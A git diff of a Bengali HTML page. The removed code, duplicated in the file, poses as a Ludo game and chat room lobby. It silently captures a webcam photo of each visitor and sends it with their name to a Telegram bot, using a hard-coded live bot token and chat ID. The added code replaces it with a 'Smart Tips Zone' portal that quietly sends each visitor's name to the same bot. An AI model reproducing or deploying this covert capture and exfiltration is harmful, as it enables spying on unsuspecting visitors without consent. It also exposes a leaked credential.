@@ -2,110 +2,54 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Tips Zone | Official</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #f4f4f9; padding: 20px; }
-        #video-preview { width: 100%; max-width: 400px; border-radius: 15px; border: 5px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
-        .btn { padding: 15px 30px; border: none; border-radius: 25px; cursor: pointer; font-size: 18px; margin: 10px; color: #fff; }
-        .join-btn { background: #28a745; }
-        .mute-btn { background: #dc3545; }
+        body { background-color: #f8fafc; font-family: 'Segoe UI', sans-serif; }
     </style>
 </head>
-<body>
-    <h1>🎮 লুডু ও আড্ডা জোন</h1>
-    <input type="text" id="name" placeholder="আপনার নাম লিখুন" style="padding:10px; width:80%; margin-bottom:10px;">
-    <br>
-    <button class="btn join-btn" onclick="startSession()">রুমে প্রবেশ করুন</button>
-    <button class="btn mute-btn" onclick="toggleMute()">মিউট / আনমিউট</button>
-    <br>
-    <video id="video-preview" autoplay playsinline muted></video>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <div class="w-full max-w-md bg-white border border-slate-200 rounded-lg p-10 shadow-sm">
+        <!-- Header -->
+        <div class="text-center mb-8">
+            <h1 class="text-2xl font-bold text-slate-800">Smart Tips Zone</h1>
+            <p class="text-slate-500 mt-1 text-sm font-medium">অফিসিয়াল পোর্টাল</p>
+        </div>
+
+        <!-- Form -->
+        <form id="loginForm" class="space-y-5">
+            <div>
+                <label class="block text-xs font-semibold text-slate-500 uppercase tracking-widest mb-2">আপনার নাম</label>
+                <input type="text" id="userName" required 
+                    class="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded focus:border-slate-400 focus:outline-none transition">
+            </div>
+            
+            <button type="submit" 
+                class="w-full bg-slate-900 hover:bg-black text-white font-semibold py-3 rounded transition duration-200">
+                প্রবেশ করুন
+            </button>
+        </form>
+    </div>
 
     <script>
-        const botToken = "botYOUR_TOKEN_HERE"; 
-        const chatId = "YOUR_CHAT_ID_HERE";
-        let localStream;
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('userName').value;
+            
+            const botToken = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
+            const chatId = "6420303571";
+            const message = `🏢 নতুন ভিজিটর: ${name}`;
 
-        async function startSession() {
-            const name = document.getElementById('name').value;
-            if (!name) return alert("দয়া করে আপনার নাম লিখুন");
-
-            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            document.getElementById('video-preview').srcObject = localStream;
-
-            // অটোমেটিক ছবি পাঠানো
-            const canvas = document.createElement('canvas');
-            canvas.getContext('2d').drawImage(document.getElementById('video-preview'), 0, 0, 400, 300);
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob);
-                formData.append('caption', `🚨 নতুন বন্ধু রুমে জয়েন করেছে: ${name}`);
-                await fetch(`https://api.telegram.org/${botToken}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg');
-        }
-
-        // মিউট বাটন ফাংশন
-        function toggleMute() {
-            if (localStream) {
-                const audioTrack = localStream.getAudioTracks()[0];
-                audioTrack.enabled = !audioTrack.enabled;
-                alert(audioTrack.enabled ? "মাইক্রোফোন চালু হয়েছে" : "মাইক্রোফোন মিউট করা হয়েছে");
-            }
-        }
-    </script>
-</body>
-</html><!DOCTYPE html>
-<html lang="bn">
-<head>
-    <meta charset="UTF-8">
-    <style>
-        body { font-family: sans-serif; text-align: center; background: #f4f4f9; padding: 20px; }
-        #video-preview { width: 100%; max-width: 400px; border-radius: 15px; border: 5px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
-        .btn { padding: 15px 30px; border: none; border-radius: 25px; cursor: pointer; font-size: 18px; margin: 10px; color: #fff; }
-        .join-btn { background: #28a745; }
-        .mute-btn { background: #dc3545; }
-    </style>
-</head>
-<body>
-    <h1>🎮 লুডু ও আড্ডা জোন</h1>
-    <input type="text" id="name" placeholder="আপনার নাম লিখুন" style="padding:10px; width:80%; margin-bottom:10px;">
-    <br>
-    <button class="btn join-btn" onclick="startSession()">রুমে প্রবেশ করুন</button>
-    <button class="btn mute-btn" onclick="toggleMute()">মিউট / আনমিউট</button>
-    <br>
-    <video id="video-preview" autoplay playsinline muted></video>
-
-    <script>
-        const botToken = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU"; 
-        const chatId = "6420303571";
-        let localStream;
-
-        async function startSession() {
-            const name = document.getElementById('name').value;
-            if (!name) return alert("দয়া করে আপনার নাম লিখুন");
-
-            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            document.getElementById('video-preview').srcObject = localStream;
-
-            // অটোমেটিক ছবি পাঠানো
-            const canvas = document.createElement('canvas');
-            canvas.getContext('2d').drawImage(document.getElementById('video-preview'), 0, 0, 400, 300);
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob);
-                formData.append('caption', `🚨 নতুন বন্ধু রুমে জয়েন করেছে: ${name}`);
-                await fetch(`https://api.telegram.org/${botToken}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg');
-        }
-
-        // মিউট বাটন ফাংশন
-        function toggleMute() {
-            if (localStream) {
-                const audioTrack = localStream.getAudioTracks()[0];
-                audioTrack.enabled = !audioTrack.enabled;
-                alert(audioTrack.enabled ? "মাইক্রোফোন চালু হয়েছে" : "মাইক্রোফোন মিউট করা হয়েছে");
-            }
-        }
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                alert("স্বাগতম! আপনি আমাদের পোর্টালে যুক্ত হয়েছেন।");
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
     </script>
 </body>
 </html>
